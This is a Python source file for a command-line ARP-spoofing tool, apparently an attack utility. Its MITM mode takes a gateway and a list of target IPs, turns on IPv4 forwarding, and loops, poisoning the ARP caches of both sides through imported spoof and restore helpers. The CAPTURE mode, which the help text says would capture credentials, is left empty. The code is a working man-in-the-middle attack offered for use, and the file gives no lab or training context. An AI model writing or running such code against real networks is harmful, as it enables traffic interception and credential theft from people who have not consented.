# IMPORTS
import argparse
import subprocess
import os
import sys
import apt

from time import sleep

# CUSTOM RESOURCES
from library.validate_address import AddressValidator
from library.custom_arp_lib import spoof, restore

# CREATE PARSER
parser = argparse.ArgumentParser()

# ADD REQUIRED ARGUMENTS
parser.add_argument("--mode", required=True, help="Specifies mode. Valid modes are MITM and CAPTURE. MITM is for man-in-the-middle attacks, and CAPTURE will spin up credential capture services on common ports")

# ARGUMENTS FOR MITM
isMitmMode = "--mode" in sys.argv and "MITM" in sys.argv
parser.add_argument("--gateway", required=isMitmMode, help="For MITM mode. The IP address of the gateway or server that you wish to place yourself in the route to from the targets")
parser.add_argument("--targeting", required=isMitmMode, help="For MITM mode. A single IP address, or a file containing newline-separated IP addresses against which to conduct a MITM attack")

# ARGUMENTS FOR CAPTURE
isCaptureMode = "--mode" in sys.argv and "CAPTURE" in sys.argv
parser.add_argument("--impersonate", required=isCaptureMode, help="For CAPTURE mode. The IP address to capture traffic to ")
parser.add_argument("--deceive", required=isCaptureMode, help="For CAPTURE mode. The IP address or a file containing IP addresses to poison the ARP cache(s) of.")

parser.add_argument("--timeout", help="Timeout in seconds between ARP requests. Default is 45.")

# VALIDATE ARGUMENTS
if not (isCaptureMode or isMitmMode):
    print(f'Specify a valid mode with the --mode flag! Use the -h option for help')
    quit()

# CHECK DEPENDENCIES
print("[+] Checking dependencies...")

# IF DOTFILE HAS BEEN WRITTEN BY PREVIOUS CHECK
if os.path.exists('.dependencies_met'):
    print("[+] Dependencies met!")

else:
    cache = apt.Cache()
    cache.open()
    if not cache["net-tools"].is_installed:
        print("[!] Please install the 'net-tools' package with 'sudo apt install net-tools'!")
        print("[!] Quitting...")
        quit()
    with open(".dependencies_met", 'w') as f:
        f.write("do not remove me, this file confirms that dependencies have been met")
    print("[+] Dependencies met!")

# PARSE ARGUMENTS
args = parser.parse_args()
mode = args.mode
timeout = None
if not args.timeout:
    timeout = 45
else:
    timeout = args.timeout

if not mode:
    print(f'[!] Error: specify a valid mode of either MITM or CAPTURE with the --mode flag')

# ENABLE ROUTE FORWARDING
print(f'[+] Checking to see if IPv4 forwarding is enabled')
fp = "/proc/sys/net/ipv4/ip_forward"
with open(fp, 'r') as f:
    val = f.read().strip()
    if val == '1':
        print(f'[+] IPv4 forwarding is already enabled')
        fwd_enabled = True
    else:
        print(val)
        print(f'[+] IPv4 forwarding is currently disabled. Enabling...')
        fwd_enabled = False
 
if not fwd_enabled:
     with open(fp, 'w') as f:
         print(1, file=f)
         print(f'[+] IPv4 forwarding enabled successfully')


############################################################
# FOR MITM MODE
############################################################
if isMitmMode:
    GATEWAY = args.gateway
    TARGETS = []

    # CHECK IF FILE EXISTS
    if os.path.exists(args.targeting):
        with open(args.targeting, 'r') as targetFile:
            t = targetFile.readlines()
            TARGETS = [target.strip() for target in t]
    else:
        TARGETS = [args.targeting]
    
    # VALIDATE TARGETS
    validator = AddressValidator()
    print(f'[+] Validating targets as IP Addresses:')
    for target in TARGETS:
        isValid = validator.check(target)
        if isValid:
            print(f'\t{target}')
        else:
            print(f'\t{target} is not a valid IP Address!')
            quit()
    
    print(f'[+] Validating gateway as IP Address:')

    if validator.check(GATEWAY):
        print(f'\t{GATEWAY}')
    else:
        print(f'\t{GATEWAY} is not a valid IP Address!')
        quit()

    # DO THE SPOOFING
    try:

        while(True):
            for target in TARGETS:

                # CONVINCE EACH TARGET I AM THE GATEWAY
                print(f'[+] Impersonating {GATEWAY} to {target}')
                spoof(target, GATEWAY) 

                # CONVINCE THE GATEWAY i AM EACH TARGET
                print(f'[+] Impersonating {target} to {GATEWAY}')
                spoof(GATEWAY, target) 


            sleep(timeout)    # WAIT <timeout> SECONDS IN BETWEEN REQUESTS


    except KeyboardInterrupt:
        print(f'\n[+] Detected Interrupt. Restoring the network, please wait!')
        for target in TARGETS:
            print(f'[+] Restoring proper \'route\' from {GATEWAY} to {target}')
            restore(GATEWAY, target)
            print(f'[+] Restoring proper \'route\' from {target} to {GATEWAY}')
            restore(target, GATEWAY)
        quit()
############################################################
# FOR CAPTURE MODE
############################################################
if isCaptureMode:
    pass